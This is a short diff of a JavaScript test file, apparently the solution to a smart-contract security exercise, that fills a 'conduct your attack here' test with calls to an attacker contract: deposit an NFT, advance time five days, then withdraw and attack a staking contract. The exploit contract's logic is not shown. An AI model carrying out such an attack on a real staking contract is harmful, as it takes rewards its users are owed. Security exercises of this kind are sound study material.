@@ -50,7 +50,12 @@ describe(NAME, function () {
 
 		// prettier-ignore
 		it("conduct your attack here", async function () {
-  
+			await attackerContract.deposit(NFTToStakeContract.address,depositoorContract.address);
+			await time.increase(5*24*3600); // increase 5 days and earn reward
+			// you can technically wait for enough time and claim the reward without having to exploit it, but that need 2 txs to claim
+			// await attackerContract.normalClaim(depositoorContract.address);
+			await attackerContract.withdrawAndAttack(depositoorContract.address);
+			
       });
 
 		after(async function () {
